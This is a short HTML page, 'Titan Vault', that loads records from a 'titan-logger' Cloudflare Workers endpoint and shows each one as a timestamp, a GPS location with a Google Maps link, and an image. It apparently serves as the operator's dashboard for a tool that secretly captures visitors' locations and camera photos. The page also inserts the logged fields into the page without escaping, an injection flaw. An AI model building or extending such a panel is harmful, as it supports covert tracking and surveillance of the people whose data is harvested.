<!DOCTYPE html>
<html>
<head>
    <title>Titan Vault</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .card { border: 1px solid #333; margin-bottom: 30px; padding: 10px; background: #111; }
        img { width: 100%; max-width: 500px; border: 1px solid #0f0; margin: 10px 0; }
        .gps-link { color: #00ff88; text-decoration: none; border-bottom: 1px dashed; }
    </style>
</head>
<body>
    <h1>TITAN CLOUD VAULT</h1>
    <div id="logs">Loading logs...</div>

    <script>
        async function load() {
            const res = await fetch("https://titan-logger.saliljha523.workers.dev");
            const data = await res.json();
            document.getElementById('logs').innerHTML = data.map(item => {
                const gps = item.location.split('GPS: ')[1];
                const mapsLink = gps && gps !== 'GPS_DENIED' ? `https://www.google.com/maps?q=${gps}` : '#';
                return `
                <div class="card">
                    <div>TIME: ${item.timestamp}</div>
                    <div>LOC: ${item.location} 
                        ${gps !== 'GPS_DENIED' ? `<a href="${mapsLink}" target="_blank" class="gps-link">[OPEN MAPS]</a>` : ''}
                    </div>
                    <img src="${item.image}">
                </div>`;
            }).join('');
        }
        load();
    </script>
</body>
</html>
